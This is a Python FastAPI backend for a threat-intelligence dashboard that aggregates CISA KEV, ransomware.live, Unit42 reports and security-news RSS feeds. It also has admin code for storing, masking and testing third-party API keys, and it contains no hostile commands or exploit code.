def _parse_victim_dt(v: dict) -> Optional[datetime]:
    for key in ("attackdate", "discovered", "date", "published"):
        raw = v.get(key)
        if not raw:
            continue
        s = str(raw).strip()
        # 1) ISO 8601 with tz (ransomware.live v2 current format): "2026-07-09T13:57:36.957462+00:00"
        try:
            # Python 3.11's fromisoformat handles offsets like +00:00 natively.
            dt = datetime.fromisoformat(s.replace("Z", "+00:00"))
            if dt.tzinfo is None:
                dt = dt.replace(tzinfo=timezone.utc)
            return dt
        except ValueError:
            pass
        # 2) Legacy formats (fallback for other sources)
        for fmt in ("%Y-%m-%d %H:%M:%S.%f", "%Y-%m-%d %H:%M:%S", "%Y-%m-%d"):
            try:
                return datetime.strptime(s, fmt).replace(tzinfo=timezone.utc)
            except ValueError:
                continue
    return None


@api_router.get("/threat-landscape/live")
async def threat_landscape_live():
    """Real-time aggregate for the landing 'Threat landscape' panel.
    Returns fresh CVE/ransomware/curated-IOC stats + recent activity so the
    UI can render a truly dynamic dashboard (frontend polls every 30s)."""
    now = datetime.now(timezone.utc)

    # --- CISA KEV (uses the same 5-min cache as /live-feed)
    total_cves = 0
    ransomware_linked = 0
    newest_cves: List[dict] = []
    try:
        feed = await live_feed()  # reuses cache
        total_cves = int(feed.get("total_count") or 0)
        ransomware_linked = int(feed.get("ransomware_linked") or 0)
        newest_cves = (feed.get("items") or [])[:6]
    except Exception as e:
        logger.warning(f"landscape/live: CISA fetch failed: {e}")

    # --- Ransomware.live (recent victims, uses 5-min cache)
    victims_24h = 0
    newest_victims: List[dict] = []
    try:
        atk = await attack_feed()
        items = atk.get("items") or []
        cutoff = now - timedelta(hours=24)
        for v in items:
            dt = _parse_victim_dt(v)
            if dt and dt >= cutoff:
                victims_24h += 1
        newest_victims = items[:6]
    except Exception as e:
        logger.warning(f"landscape/live: ransomware.live fetch failed: {e}")

    # --- Curated IOC database (live count + severity split)
    total_iocs = await db.iocs.count_documents({}) or 0
    critical_iocs = await db.iocs.count_documents({"severity": "critical"}) or 0

    # --- Last sync across all sync-meta docs (freshness signal)
    last_synced_at = None
    last_synced_source = None
    try:
        async for doc in db.sync_meta.find({}, {"_id": 1, "synced_at": 1}):
            ts = doc.get("synced_at")
            if ts and (last_synced_at is None or ts > last_synced_at):
                last_synced_at = ts
                last_synced_source = doc.get("_id")
        otx_doc = await db.otx_meta.find_one({"_id": "last_sync"}, {"synced_at": 1})
        if otx_doc and otx_doc.get("synced_at") and (last_synced_at is None or otx_doc["synced_at"] > last_synced_at):
            last_synced_at = otx_doc["synced_at"]
            last_synced_source = "otx"
    except Exception:
        pass

    # --- New CVEs added in the last 7 days (approximate "attack surface velocity")
    cves_last_7d = 0
    try:
        week_cutoff = (now - timedelta(days=7)).date().isoformat()
        for c in newest_cves:
            if (c.get("dateAdded") or "") >= week_cutoff:
                cves_last_7d += 1
        # Extend the count by scanning the full feed (already cached).
        if _feed_cache.get("data"):
            for c in (_feed_cache["data"].get("items") or []):
                if (c.get("dateAdded") or "") >= week_cutoff:
                    cves_last_7d += 1
            # We double-counted the newest set above; subtract it back.
            cves_last_7d -= sum(1 for c in newest_cves if (c.get("dateAdded") or "") >= week_cutoff)
    except Exception:
        pass

    return {
        "updated_at": now.isoformat(),
        "stats": {
            "total_cves": total_cves,
            "ransomware_linked_cves": ransomware_linked,
            "cves_last_7d": max(cves_last_7d, 0),
            "victims_24h": victims_24h,
            "curated_iocs": total_iocs,
            "critical_iocs": critical_iocs,
        },
        "last_synced_at": last_synced_at,
        "last_synced_source": last_synced_source,
        "newest_cves": newest_cves,
        "newest_victims": newest_victims,
    }



# ---------------------------------------------------------------------------
# Unit42 Timely Threat Intel feed (real published intel from Palo Alto GitHub)
# ---------------------------------------------------------------------------
_intel_cache: dict[str, Any] = {"ts": None, "data": None}
UNIT42_REPO = "PaloAltoNetworks/Unit42-timely-threat-intel"

_INTEL_IMAGES = {
    "phishing": "https://images.pexels.com/photos/5380664/pexels-photo-5380664.jpeg?auto=compress&cs=tinysrgb&w=1000",
    "ransomware": "https://images.pexels.com/photos/60504/security-protection-anti-virus-software-60504.jpeg?auto=compress&cs=tinysrgb&w=1000",
    "rat": "https://images.pexels.com/photos/5473298/pexels-photo-5473298.jpeg?auto=compress&cs=tinysrgb&w=1000",
    "loader": "https://images.pexels.com/photos/11035380/pexels-photo-11035380.jpeg?auto=compress&cs=tinysrgb&w=1000",
    "scam": "https://images.pexels.com/photos/5380642/pexels-photo-5380642.jpeg?auto=compress&cs=tinysrgb&w=1000",
    "stealer": "https://images.pexels.com/photos/2881229/pexels-photo-2881229.jpeg?auto=compress&cs=tinysrgb&w=1000",
    "default": "https://images.pexels.com/photos/5483240/pexels-photo-5483240.jpeg?auto=compress&cs=tinysrgb&w=1000",
}


def _pick_intel_image(title: str) -> str:
    t = title.lower()
    for key, url in _INTEL_IMAGES.items():
        if key != "default" and key in t:
            return url
    return _INTEL_IMAGES["default"]


INTEL_TYPES = ["Ransomware", "Phishing", "RAT", "Loader", "Stealer", "Scam", "APT", "Other"]


def _intel_type(title: str) -> str:
    t = title.lower()
    if any(k in t for k in ["ransom", "lockbit", "akira", "blackcat", "alphv", "encrypt"]):
        return "Ransomware"
    if any(k in t for k in ["phish", "smish", "clickfix", "credential"]):
        return "Phishing"
    if any(k in t for k in ["rat", "asyncrat", "remote access", "njrat", "remcos"]):
        return "RAT"
    if any(k in t for k in ["loader", "castleloader", "downloader", "dropper"]):
        return "Loader"
    if any(k in t for k in ["stealer", "infostealer", "lumma", "redline"]):
        return "Stealer"
    if any(k in t for k in ["scam", "fraud", "impersonat"]):
        return "Scam"
    if any(k in t for k in ["apt", "espionage", "state-sponsored", "nation"]):
        return "APT"
    return "Other"


_intel_listing: dict[str, Any] = {"ts": None, "names": None}


async def _get_unit42_listing() -> list:
    now = datetime.now(timezone.utc)
    if _intel_listing["names"] and _intel_listing["ts"] and (now - _intel_listing["ts"]) < timedelta(minutes=60):
        return _intel_listing["names"]
    async with httpx.AsyncClient(timeout=20, follow_redirects=True) as hc:
        listing = await hc.get(f"https://api.github.com/repos/{UNIT42_REPO}/contents/")
        listing.raise_for_status()
        names = sorted([f["name"] for f in listing.json() if f["name"].endswith(".txt")], reverse=True)
    _intel_listing["names"] = names
    _intel_listing["ts"] = now
    return names


def _parse_unit42(name: str, text: str) -> dict:
    date = name[:10]
    title = name[11:-4].replace("-", " ")
    lines = text.splitlines()
    section = None
    notes, refs, indicators, authors = [], [], [], []
    for ln in lines:
        s = ln.strip()
        up = s.upper()
        if up.startswith("NOTES:"):
            section = "notes"
            continue
        if up.startswith("REFERENCES:"):
            section = "refs"
            continue
        if up.startswith("INDICATORS:") or up.startswith("INDICATORS "):
            section = "ind"
            continue
        if up.startswith("AUTHOR:"):
            section = "author"
            continue
        if not s:
            continue
        if section == "notes" and s.startswith("-"):
            notes.append(s.lstrip("- ").strip())
        elif section == "refs" and ("http" in s):
            refs.append(s.lstrip("- ").strip())
        elif section == "author" and s.startswith("-"):
            authors.append(s.lstrip("- ").strip())
        elif section == "ind":
            indicators.append(s)
    summary = " ".join(notes[:2])[:320] if notes else title
    ioc_lines = [i for i in indicators if "[.]" in i or "[:]" in i or "sha256" in i.lower() or "md5" in i.lower()]
    return {
        "name": name,
        "title": title,
        "date": date,
        "type": _intel_type(title),
        "authors": authors,
        "summary": summary,
        "notes": notes,
        "references": refs,
        "indicators": ioc_lines,
        "reference": refs[0] if refs else f"https://github.com/{UNIT42_REPO}/blob/main/{name}",
        "url": f"https://github.com/{UNIT42_REPO}/blob/main/{name}",
        "ioc_count": len(ioc_lines),
        "image": _pick_intel_image(title),
        "source": "Palo Alto Unit42",
    }


def _intel_card(full: dict) -> dict:
    """Lightweight card view (drops heavy indicator/notes lists)."""
    return {
        "name": full["name"], "title": full["title"], "date": full["date"], "type": full["type"],
        "summary": full["summary"], "reference": full["reference"], "url": full["url"],
        "ioc_count": full["ioc_count"], "image": full["image"], "source": full["source"],
    }


@api_router.get("/intel-report/{name}")
async def intel_report(name: str):
    """Full parsed Unit42 report for the in-app reader."""
    if not re.match(r"^[0-9A-Za-z._-]+\.txt$", name):
        raise HTTPException(status_code=400, detail="Invalid report name")
    try:
        async with httpx.AsyncClient(timeout=20, follow_redirects=True) as hc:
            resp = await hc.get(f"https://raw.githubusercontent.com/{UNIT42_REPO}/main/{name}")
            resp.raise_for_status()
            full = _parse_unit42(name, resp.text)
        full["indicators"] = full["indicators"][:500]
        return full
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Intel report error for {name}: {e}")
        raise HTTPException(status_code=502, detail="Unable to load report")


@api_router.get("/intel-feed")
async def intel_feed(page: int = 1, page_size: int = 9, q: str = "", type: str = "", since: str = ""):
    """Paginated + filterable Unit42 intel feed. Filters on filename metadata, fetches content per page."""
    page = max(1, page)
    page_size = min(max(1, page_size), 24)
    try:
        names = await _get_unit42_listing()

        def match(name: str) -> bool:
            title = name[11:-4].replace("-", " ")
            date = name[:10]
            if q and q.lower() not in title.lower():
                return False
            if type and _intel_type(title) != type:
                return False
            if since and date < since:
                return False
            return True

        filtered = [n for n in names if match(n)]
        total = len(filtered)
        start = (page - 1) * page_size
        page_names = filtered[start:start + page_size]

        async with httpx.AsyncClient(timeout=20, follow_redirects=True) as hc:
            async def fetch(name):
                try:
                    resp = await hc.get(f"https://raw.githubusercontent.com/{UNIT42_REPO}/main/{name}")
                    resp.raise_for_status()
                    return _intel_card(_parse_unit42(name, resp.text))
                except Exception:
                    return _intel_card(_parse_unit42(name, ""))

            items = await asyncio.gather(*[fetch(n) for n in page_names])

        return {
            "source": "Palo Alto Networks · Unit42 Timely Threat Intel",
            "repo_url": f"https://github.com/{UNIT42_REPO}",
            "updated": datetime.now(timezone.utc).isoformat(),
            "types": INTEL_TYPES,
            "total": total,
            "page": page,
            "page_size": page_size,
            "has_more": start + page_size < total,
            "count": len(items),
            "items": list(items),
        }
    except Exception as e:
        logger.error(f"Intel feed error: {e}")
        raise HTTPException(status_code=502, detail="Unable to reach Unit42 intel feed")


# ---------------------------------------------------------------------------
# Community aggregator — returns metadata (title, cover image, short snippet,
# date, source URL) scraped from the CyberDefenders blog. NOTE: this returns
# ONLY metadata/short snippets. Article bodies are NOT reproduced. Card clicks
# on the frontend open the source article on cyberdefenders.org directly.
# ---------------------------------------------------------------------------
_CD_CACHE: dict = {"ts": None, "data": None}
_CD_TTL = timedelta(hours=6)

CD_TOPIC_KEYWORDS = {
    "dfir":    ["forensic", "disk", "memory", "incident", "investigation", "triage", "evidence", "case study", "usb", "bec", "email compromise"],
    "malware": ["malware", "ransomware", "powershell", "encoded", "fileless", "cross-site", "xss", "phishing", "trojan"],
    "soc":     ["soc", "hunt", "detection", "alert", "playbook", "mindset", "hacker mindset", "ids", "intrusion detection", "apt", "persistence", "threat intel", "azure", "cloud security"],
}


def _cd_topic_for(title: str, excerpt: str) -> str:
    text = f"{title} {excerpt}".lower()
    scores = {t: sum(1 for kw in kws if kw in text) for t, kws in CD_TOPIC_KEYWORDS.items()}
    top = max(scores, key=scores.get)
    return top if scores[top] > 0 else "soc"


@api_router.get("/community/cd-articles")
async def community_cd_articles(topic: Optional[str] = None):
    """Public curator endpoint. Returns cyberdefenders.org blog article
    metadata (title, cover, snippet, date, url) grouped by topic. Snippet is
    truncated to <=180 chars (fair-use excerpt). Cached for 6h."""
    now = datetime.now(timezone.utc)
    if _CD_CACHE["data"] and _CD_CACHE["ts"] and (now - _CD_CACHE["ts"]) < _CD_TTL:
        articles = _CD_CACHE["data"]
    else:
        try:
            async with httpx.AsyncClient(timeout=20, follow_redirects=True, headers={"User-Agent": "NivX-Aggregator/1.0"}) as hc:
                r = await hc.get("https://cyberdefenders.org/blog/")
                if r.status_code != 200:
                    raise HTTPException(status_code=502, detail=f"CyberDefenders returned HTTP {r.status_code}")
                html = r.text
        except Exception as e:
            raise HTTPException(status_code=502, detail=f"CyberDefenders fetch failed: {e}")

        # Extract article cards. Each card block links to /blog/<slug>/ and contains
        # a featured image (in /media/blog/featured_images/) + a title + a short paragraph.
        # Extract article cards from the CD blog listing HTML. We only pull metadata
        # (title, cover, ~180-char snippet, date, source URL) — no article bodies.
        articles = []
        seen_slugs: set = set()
        # Each card is anchored by <a href="/blog/<slug>/"> ... </a>
        for m in re.finditer(r'<a[^>]+href="(/blog/([a-z0-9\-]+)/)"[^>]*>(.*?)</a>', html, re.DOTALL):
            path, slug, block = m.group(1), m.group(2), m.group(3)
            if slug in seen_slugs or slug in ("", "feed"):
                continue
            # Skip pagination / non-article links (must contain a card with an <h3>)
            title_m = re.search(r'<h3[^>]*>([^<]+)</h3>', block)
            if not title_m:
                continue
            seen_slugs.add(slug)
            title = re.sub(r"\s+", " ", title_m.group(1).replace("&#x27;", "'").replace("&amp;", "&")).strip()
            img_m = re.search(r'<img[^>]+src="([^"]+)"', block)
            excerpt_m = re.search(r'<p[^>]*line-clamp-3[^>]*>([^<]+)</p>', block)
            excerpt_raw = (excerpt_m.group(1) if excerpt_m else "").strip()
            excerpt = re.sub(r"\s+", " ", excerpt_raw)[:180].rstrip()
            if excerpt and not excerpt.endswith("…"):
                excerpt = excerpt.rstrip(". ") + "…"
            date_m = re.search(r'<time[^>]*>([^<]+)</time>', block)
            cat_m = re.search(r'data-slot="badge"[^>]*>[^<]*</span>[^<]*<span[^>]*>([^<]+)</span>', block) or \
                    re.search(r'<span[^>]*capitalize[^>]*>([^<]+)</span>', block)
            item = {
                "slug": slug,
                "url": "https://cyberdefenders.org" + path,
                "title": title,
                "image": img_m.group(1) if img_m else None,
                "date": date_m.group(1).strip() if date_m else None,
                "category": (cat_m.group(1).strip() if cat_m else "Cybersecurity"),
                "excerpt": excerpt,
                "topic": _cd_topic_for(title, excerpt),
            }
            articles.append(item)
            if len(articles) >= 30:
                break

        _CD_CACHE["ts"] = now
        _CD_CACHE["data"] = articles

    if topic:
        t = topic.lower()
        articles = [a for a in articles if a.get("topic") == t]

    return {
        "source": "cyberdefenders.org/blog",
        "attribution": "Content curated from CyberDefenders. Click 'Read on CyberDefenders' to view the full article on the source site.",
        "count": len(articles),
        "articles": articles,
    }



@api_router.get("/")
async def root():
    return {"message": "NivX Machines API online"}



# ---------------------------------------------------------------------------
# Generic RSS/Atom aggregator — Talos, Unit42, etc. Metadata only (title,
# summary snippet capped at 200 chars, cover image, publish date, source URL).
# Card clicks on the frontend open the source article in a new tab.
# ---------------------------------------------------------------------------
_RSS_CACHE: dict = {}
_RSS_TTL = timedelta(minutes=30)

RSS_SOURCES = {
    "talos":        {"name": "Cisco Talos Intelligence",         "url": "https://blog.talosintelligence.com/rss/",                                                                          "site": "https://blog.talosintelligence.com"},
    "unit42":       {"name": "Palo Alto Unit 42",                 "url": "https://unit42.paloaltonetworks.com/feed/",                                                                        "site": "https://unit42.paloaltonetworks.com"},
    "dfir":         {"name": "The DFIR Report",                   "url": "https://thedfirreport.com/feed/",                                                                                   "site": "https://thedfirreport.com"},
    "msthreat":     {"name": "Microsoft Threat Intelligence",     "url": "https://www.microsoft.com/en-us/security/blog/topic/threat-intelligence/feed/",                                    "site": "https://www.microsoft.com/en-us/security/blog/topic/threat-intelligence/"},
    "bleeping":     {"name": "BleepingComputer",                  "url": "https://www.bleepingcomputer.com/feed/",                                                                            "site": "https://www.bleepingcomputer.com"},
    "hn":           {"name": "Hacker News",                       "url": "https://news.ycombinator.com/rss",                                                                                  "site": "https://news.ycombinator.com"},
    "thn":          {"name": "The Hacker News",                   "url": "https://feeds.feedburner.com/TheHackersNews",                                                                       "site": "https://thehackernews.com"},
    "krebs":        {"name": "Krebs on Security",                 "url": "https://krebsonsecurity.com/feed/",                                                                                 "site": "https://krebsonsecurity.com"},
    "darkreading":  {"name": "Dark Reading",                       "url": "https://www.darkreading.com/rss.xml",                                                                              "site": "https://www.darkreading.com"},
    "securityweek": {"name": "SecurityWeek",                       "url": "https://www.securityweek.com/feed/",                                                                                "site": "https://www.securityweek.com"},
    "therecord":    {"name": "The Record (Recorded Future)",      "url": "https://therecord.media/feed/",                                                                                     "site": "https://therecord.media"},
}


def _clean_text(s: str) -> str:
    """Strip HTML tags and CDATA wrappers, collapse whitespace."""
    if not s:
        return ""
    s = re.sub(r"<!\[CDATA\[(.*?)\]\]>", r"\1", s, flags=re.DOTALL)
    s = re.sub(r"<[^>]+>", " ", s)
    s = s.replace("&amp;", "&").replace("&#8217;", "'").replace("&#8220;", "\u201C").replace("&#8221;", "\u201D").replace("&nbsp;", " ")
    return re.sub(r"\s+", " ", s).strip()


def _parse_rss_feed(xml: str, max_items: int = 15) -> list[dict]:
    """Parse a basic RSS 2.0 or Atom feed into [{slug, url, title, image, date, excerpt}].
    Snippets capped at 200 chars for fair-use aggregation."""
    items: list[dict] = []
    # RSS 2.0 <item>
    for m in re.finditer(r"<item[^>]*>(.*?)</item>", xml, re.DOTALL | re.IGNORECASE):
        block = m.group(1)
        title = _clean_text((re.search(r"<title[^>]*>(.*?)</title>", block, re.DOTALL) or re.match("$^", "")).group(1)) if re.search(r"<title", block) else ""
        link_m = re.search(r"<link[^>]*>(.*?)</link>", block, re.DOTALL)
        link = _clean_text(link_m.group(1)) if link_m else ""
        date_m = re.search(r"<pubDate[^>]*>(.*?)</pubDate>", block, re.DOTALL) or re.search(r"<dc:date[^>]*>(.*?)</dc:date>", block, re.DOTALL)
        date = _clean_text(date_m.group(1)) if date_m else ""
        desc_m = re.search(r"<description[^>]*>(.*?)</description>", block, re.DOTALL) or re.search(r"<content:encoded[^>]*>(.*?)</content:encoded>", block, re.DOTALL)
        desc_html = desc_m.group(1) if desc_m else ""
        img_m = re.search(r'<enclosure[^>]+url="([^"]+)"', block) or re.search(r'<media:content[^>]+url="([^"]+)"', block) or re.search(r'<media:thumbnail[^>]+url="([^"]+)"', block) or re.search(r'<img[^>]+src="([^"]+)"', desc_html or block)
        image = img_m.group(1) if img_m else None
        excerpt = _clean_text(desc_html)[:200].rstrip()
        if excerpt and not excerpt.endswith("…"):
            excerpt = excerpt.rstrip(". ") + "…"
        if title and link:
            slug = link.rstrip("/").split("/")[-1][:80]
            # Prefer human date if parseable.
            display_date = date
            iso_date = None
            try:
                from email.utils import parsedate_to_datetime
                dt = parsedate_to_datetime(date)
                if dt.tzinfo is None:
                    dt = dt.replace(tzinfo=timezone.utc)
                display_date = dt.strftime("%b %-d, %Y")
                iso_date = dt.astimezone(timezone.utc).isoformat()
            except Exception:
                pass
            items.append({"slug": slug or f"item-{len(items)}", "url": link, "title": title, "image": image, "date": display_date, "iso_date": iso_date, "excerpt": excerpt, "category": "Threat Research"})
            if len(items) >= max_items:
                break
    return items


@api_router.get("/community/feed/{source}")
async def community_feed(source: str):
    """Aggregate a single RSS/Atom threat-intel feed as metadata cards.
    Returns title, cover image, ~200-char snippet, date, source URL. Cached 6h."""
    src = RSS_SOURCES.get(source)
    if not src:
        raise HTTPException(status_code=404, detail=f"Unknown source '{source}'. Available: {', '.join(RSS_SOURCES)}")
    now = datetime.now(timezone.utc)
    cached = _RSS_CACHE.get(source)
    if cached and (now - cached["ts"]) < _RSS_TTL:
        articles = cached["data"]
    else:
        try:
            async with httpx.AsyncClient(timeout=20, follow_redirects=True, headers={"User-Agent": "NivX-Aggregator/1.0"}) as hc:
                r = await hc.get(src["url"])
                if r.status_code != 200:
                    raise HTTPException(status_code=502, detail=f"{src['name']} returned HTTP {r.status_code}")
                articles = _parse_rss_feed(r.text, max_items=15)
        except HTTPException:
            raise
        except Exception as e:
            raise HTTPException(status_code=502, detail=f"{src['name']} fetch failed: {e}")
        _RSS_CACHE[source] = {"ts": now, "data": articles}

    return {
        "source": src["name"],
        "site": src["site"],
        "attribution": f"Content curated from {src['name']}. Click any card to read the full article on the source site.",
        "count": len(articles),
        "articles": articles,
    }


@api_router.get("/community/firehose")
async def community_firehose(limit: int = 60):
    """Merged live-firehose feed: pulls every configured RSS source in parallel,
    de-duplicates by URL, sorts by publish date DESC, and returns a single
    unified list. Powers the Blog page's "Live Cyber News" section. Cached
    server-side via the per-source _RSS_CACHE."""
    now = datetime.now(timezone.utc)
    tasks = []
    labels = []
    for slug, src in RSS_SOURCES.items():
        cached = _RSS_CACHE.get(slug)
        if cached and (now - cached["ts"]) < _RSS_TTL:
            tasks.append(asyncio.sleep(0, result=cached["data"]))
            labels.append((slug, src))
            continue

        async def _fetch(slug=slug, src=src):
            try:
                async with httpx.AsyncClient(timeout=15, follow_redirects=True, headers={"User-Agent": "NivX-Aggregator/1.0"}) as hc:
                    r = await hc.get(src["url"])
                    if r.status_code != 200:
                        return []
                    parsed = _parse_rss_feed(r.text, max_items=15)
                    _RSS_CACHE[slug] = {"ts": now, "data": parsed}
                    return parsed
            except Exception:
                return []
        tasks.append(_fetch())
        labels.append((slug, src))

    results = await asyncio.gather(*tasks, return_exceptions=True)
    merged: list[dict] = []
    seen_urls: set[str] = set()
    for (slug, src), items in zip(labels, results):
        if isinstance(items, Exception) or not items:
            continue
        for a in items:
            url = a.get("url")
            if not url or url in seen_urls:
                continue
            seen_urls.add(url)
            merged.append({**a, "source_slug": slug, "source_name": src["name"], "source_site": src["site"]})

    # Sort by parsed date descending (fallback: original list order).
    def _dt(a):
        try:
            return datetime.fromisoformat(str(a.get("iso_date") or "").replace("Z", "+00:00")) if a.get("iso_date") else datetime.min.replace(tzinfo=timezone.utc)
        except Exception:
            return datetime.min.replace(tzinfo=timezone.utc)
    merged.sort(key=_dt, reverse=True)

    return {
        "updated_at": now.isoformat(),
        "sources": [{"slug": s, "name": src["name"], "site": src["site"]} for s, src in RSS_SOURCES.items()],
        "count": min(len(merged), max(1, min(limit, 200))),
        "articles": merged[: max(1, min(limit, 200))],
    }


# ---------------------------------------------------------------------------
# Admin Settings — DB-backed override for API keys + community source toggles.
# DB value wins over .env, so the app can be moved to any server and keys can
# be rotated from the Admin panel without redeploying.
# ---------------------------------------------------------------------------
API_KEY_SETTINGS = [
    {"name": "VIRUSTOTAL_API_KEY",    "label": "VirusTotal",              "get_url": "https://www.virustotal.com/gui/my-apikey",                    "desc": "Reputation for files, hashes, domains, URLs & IPs.",   "global_var": "VT_API_KEY"},
    {"name": "ABUSEIPDB_API_KEY",     "label": "AbuseIPDB",               "get_url": "https://www.abuseipdb.com/account/api",                       "desc": "IP address abuse-confidence scoring.",                 "global_var": "ABUSEIPDB_API_KEY"},
    {"name": "URLSCAN_API_KEY",       "label": "URLScan.io",              "get_url": "https://urlscan.io/user/profile/",                            "desc": "URL sandbox scans + verdict search.",                  "global_var": "URLSCAN_API_KEY"},
    {"name": "OTX_API_KEY",           "label": "AlienVault OTX",          "get_url": "https://otx.alienvault.com/api",                              "desc": "Community threat intel pulses & indicators.",          "global_var": "OTX_API_KEY"},
    {"name": "HYBRID_ANALYSIS_API_KEY","label": "Hybrid Analysis (Falcon)","get_url": "https://www.hybrid-analysis.com/my-account?tab=%23api-key-tab","desc": "Falcon Sandbox sample lookups & recent-samples feed.", "global_var": "HYBRID_ANALYSIS_API_KEY"},
    {"name": "MALWAREBAZAAR_API_KEY", "label": "MalwareBazaar (abuse.ch)","get_url": "https://bazaar.abuse.ch/account/",                            "desc": "Hash lookup & recent-malware samples feed.",           "global_var": "MALWAREBAZAAR_API_KEY"},
    {"name": "EMERGENT_LLM_KEY",      "label": "Emergent LLM Key (AI summaries)", "get_url": "https://app.emergent.sh/", "desc": "Powers the Gemini 3 Flash AI summaries in the IOC Analyzer. Falls back gracefully to templated summaries when absent.", "global_var": "EMERGENT_LLM_KEY"},
]
_API_KEY_INDEX = {k["name"]: k for k in API_KEY_SETTINGS}

# When an admin saves one of these API keys, we auto-fire the matching bulk-IOC
# sync in the background so fresh data flows in immediately (no manual click).
_KEY_SYNC_MAP = {
    "VIRUSTOTAL_API_KEY":      ("virustotal",      "_sync_virustotal_intel"),
    "OTX_API_KEY":             ("otx",             "_sync_otx_pulses"),
    "HYBRID_ANALYSIS_API_KEY": ("hybrid_analysis", "_sync_hybrid_analysis_feed"),
    "ABUSEIPDB_API_KEY":       ("abuseipdb",       "_sync_abuseipdb_blacklist"),
    "MALWAREBAZAAR_API_KEY":   ("malwarebazaar",   "_sync_malwarebazaar_recent"),
}


def _fire_sync_for_key(key_name: str) -> bool:
    """Kick off the matching sync in the background. Returns True if fired."""
    m = _KEY_SYNC_MAP.get(key_name)
    if not m:
        return False
    _label, fn_name = m
    fn = globals().get(fn_name)
    if not fn:
        return False
    try:
        asyncio.create_task(fn())
        logger.info(f"Auto-sync fired for {key_name} → {fn_name}")
        return True
    except Exception as e:
        logger.warning(f"Auto-sync trigger failed for {key_name}: {e}")
        return False

COMMUNITY_SOURCES = [
    {"slug": "talos",         "label": "Cisco Talos Intelligence"},
    {"slug": "unit42",        "label": "Palo Alto Unit 42"},
    {"slug": "dfir",          "label": "The DFIR Report"},
    {"slug": "msthreat",      "label": "Microsoft Threat Intelligence"},
    {"slug": "bleeping",      "label": "BleepingComputer"},
    {"slug": "hn",            "label": "Hacker News"},
    {"slug": "cyberdefenders","label": "CyberDefenders (DFIR / Malware / SOC)"},
]
_COMMUNITY_SLUGS = [s["slug"] for s in COMMUNITY_SOURCES]


def _mask_key(v: str) -> str:
    if not v:
        return ""
    v = str(v)
    if len(v) <= 8:
        return "*" * len(v)
    return v[:4] + "…" + v[-4:]


async def _load_settings_from_db():
    """Read overrides from Mongo (app_settings) and patch module-level globals.
    Called at startup and after every admin write so changes take effect live."""
    docs = await db.app_settings.find({}).to_list(100)
    by_key = {d.get("key"): d.get("value") for d in docs}
    for spec in API_KEY_SETTINGS:
        override = by_key.get(spec["name"])
        effective = override if override else os.environ.get(spec["name"])
        globals()[spec["global_var"]] = effective
    # Keep the Hybrid Analysis static-headers dict in sync so live rotation actually applies.
    globals()["_HA_HEADERS"] = {"api-key": globals().get("HYBRID_ANALYSIS_API_KEY") or "", "User-Agent": "Falcon Sandbox", "Accept": "application/json"}


async def _get_enabled_community_sources() -> list[str]:
    doc = await db.app_settings.find_one({"key": "COMMUNITY_ENABLED_SOURCES"})
    if not doc or not isinstance(doc.get("value"), list):
        return list(_COMMUNITY_SLUGS)  # all enabled by default
    return [s for s in doc["value"] if s in _COMMUNITY_SLUGS]


async def _test_api_key(name: str, value: str) -> dict:
    """Live-probe a provider with the given key. Returns {ok, message}."""
    if not value:
        return {"ok": False, "message": "Empty key"}
    try:
        async with httpx.AsyncClient(timeout=15, follow_redirects=True, headers={"User-Agent": "NivX-KeyTest/1.0"}) as hc:
            if name == "VIRUSTOTAL_API_KEY":
                r = await hc.get("https://www.virustotal.com/api/v3/ip_addresses/8.8.8.8", headers={"x-apikey": value, "accept": "application/json"})
                if r.status_code == 200:
                    return {"ok": True, "message": "Valid — VirusTotal responded 200."}
                if r.status_code in (401, 403):
                    return {"ok": False, "message": f"Invalid or unauthorised (HTTP {r.status_code})."}
                return {"ok": False, "message": f"Unexpected HTTP {r.status_code}."}
            if name == "ABUSEIPDB_API_KEY":
                r = await hc.get("https://api.abuseipdb.com/api/v2/check", params={"ipAddress": "8.8.8.8"}, headers={"Key": value, "Accept": "application/json"})
                if r.status_code == 200:
                    return {"ok": True, "message": "Valid — AbuseIPDB responded 200."}
                if r.status_code in (401, 403):
                    return {"ok": False, "message": f"Invalid or unauthorised (HTTP {r.status_code})."}
                return {"ok": False, "message": f"Unexpected HTTP {r.status_code}."}
            if name == "URLSCAN_API_KEY":
                r = await hc.get("https://urlscan.io/user/quotas/", headers={"API-Key": value})
                if r.status_code == 200:
                    return {"ok": True, "message": "Valid — URLScan responded 200."}
                if r.status_code in (401, 403):
                    return {"ok": False, "message": f"Invalid or unauthorised (HTTP {r.status_code})."}
                return {"ok": False, "message": f"Unexpected HTTP {r.status_code}."}
            if name == "OTX_API_KEY":
                r = await hc.get("https://otx.alienvault.com/api/v1/user/me", headers={"X-OTX-API-KEY": value})
                if r.status_code == 200:
                    return {"ok": True, "message": "Valid — OTX responded 200."}
                if r.status_code in (401, 403):
                    return {"ok": False, "message": f"Invalid or unauthorised (HTTP {r.status_code})."}
                return {"ok": False, "message": f"Unexpected HTTP {r.status_code}."}
            if name == "HYBRID_ANALYSIS_API_KEY":
                r = await hc.get("https://hybrid-analysis.com/api/v2/key/current", headers={"api-key": value, "User-Agent": "Falcon Sandbox", "Accept": "application/json"})
                if r.status_code == 200:
                    return {"ok": True, "message": "Valid — Hybrid Analysis responded 200."}
                if r.status_code in (401, 403):
                    return {"ok": False, "message": f"Invalid or unauthorised (HTTP {r.status_code})."}
                return {"ok": False, "message": f"Unexpected HTTP {r.status_code}."}
            if name == "MALWAREBAZAAR_API_KEY":
                r = await hc.post("https://mb-api.abuse.ch/api/v1/", data={"query": "get_recent", "selector": "time"}, headers={"Auth-Key": value})
                if r.status_code == 200:
                    try:
                        j = r.json()
                        if j.get("query_status") in ("ok", "no_results"):
                            return {"ok": True, "message": "Valid — MalwareBazaar responded ok."}
                        if j.get("query_status") == "unauthenticated":
                            return {"ok": False, "message": "Invalid MalwareBazaar Auth-Key (unauthenticated)."}
                        return {"ok": False, "message": f"MalwareBazaar status: {j.get('query_status')}"}
                    except Exception:
                        return {"ok": False, "message": "Unexpected response body."}
                return {"ok": False, "message": f"Unexpected HTTP {r.status_code}."}
            if name == "EMERGENT_LLM_KEY":
                # No cheap live probe; accept any non-empty key that looks like the Emergent format.
                looks_ok = value.startswith("sk-") and len(value) > 20
                return {"ok": looks_ok, "message": "Format looks valid (live probe not run to conserve quota)." if looks_ok else "Emergent LLM keys typically start with 'sk-' and are >20 chars."}
    except httpx.TimeoutException:
        return {"ok": False, "message": "Timed out talking to provider."}
    except Exception as e:
        return {"ok": False, "message": f"Probe failed: {e}"}
    return {"ok": False, "message": "Unknown key."}


class ApiKeyUpdate(BaseModel):
    value: str


